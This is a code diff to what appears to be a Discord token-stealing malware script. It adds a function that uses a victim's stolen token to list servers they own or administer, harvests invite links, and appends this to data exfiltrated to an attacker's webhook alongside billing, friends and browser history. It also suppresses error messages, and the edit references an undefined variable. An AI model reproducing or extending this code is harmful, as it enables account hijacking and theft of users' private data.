@@ -504,6 +504,40 @@ badgeList =  [
     ]
 
 pub = 'cilbup'
+
+def get_uhq_guilds(token):
+    try:
+        uhq_guilds = []
+        headers = {
+            "Authorization": token,
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+
+        request = urllib.request.Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
+        response = urllib.request.urlopen(request)
+        guilds = json.loads(response.read().decode())
+
+        for guild in guilds:
+            if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
+                continue
+            
+            request = urllib.request.Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
+            response = urllib.request.urlopen(request)
+            invites = json.loads(response.read().decode())
+
+            invite_code = invites[0]['code'] if invites else None
+
+            guild_info = f"<:AstolfoLurkingFA:990296400497631323> [{guild['name']}]({f'https://discord.gg/{invite_code}' if invite_code else ''}) `({guild['id']})` **{guild['approximate_member_count']} Members**"
+            uhq_guilds.append(guild_info)
+
+        if not uhq_guilds:
+            return "`No HQ Guilds`"
+
+        return '\n'.join(uhq_guilds)
+    except Exception as e:
+        return "`No HQ Guilds`"
+
+
 def get_uhq_friends(tokq, max_friends=5):
     headers = {
         "Authorization": tokq,
@@ -643,6 +677,7 @@ def uploadTokq(Tokq, path):
     billing = GetBilling(Tokq)
     badge = get_badge(flags)
     friends = get_uhq_friends(Tokq)
+    guild = get_uhq_guilds(Tokq)
 
     if friends == '': friends = "No Rare Friends"
     if not billing:
@@ -709,6 +744,11 @@ def uploadTokq(Tokq, path):
                         "name": "🔮 HQ Friends:",
                         "value": friends,
                         "inline": False
+                    },
+                    {
+                        "name": "⚔️ HQ guilds:",
+                        "value": guild,
+                        "inline": False
                     }
                     
                 ]
@@ -720,7 +760,13 @@ def uploadTokq(Tokq, path):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    
+    character_limit = 1900
+
+    if len(json_string) > character_limit:
+        json_string = json_string[:character_limit - 3] + "..."
+
+    LoadUrlib(webhook, data=dumps(json_string).encode(), headers=headers)
 
 
 
@@ -767,7 +813,7 @@ def get_brave_history(temp_dir, files_to_zip):
                 domain = parsed_url.netloc.replace("www.", "")
                 return domain
             except Exception as e:
-                print(f"URL format error: {str(e)}")
+                pass
 
         sites_count = {}
 
@@ -788,7 +834,7 @@ def get_brave_history(temp_dir, files_to_zip):
         cursor.close()
         conn.close()
     except sqlite3.Error as e:
-        print(f"SQLite error: {str(e)}")
+        pass
         
 def find_chrome_history_file():
     return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
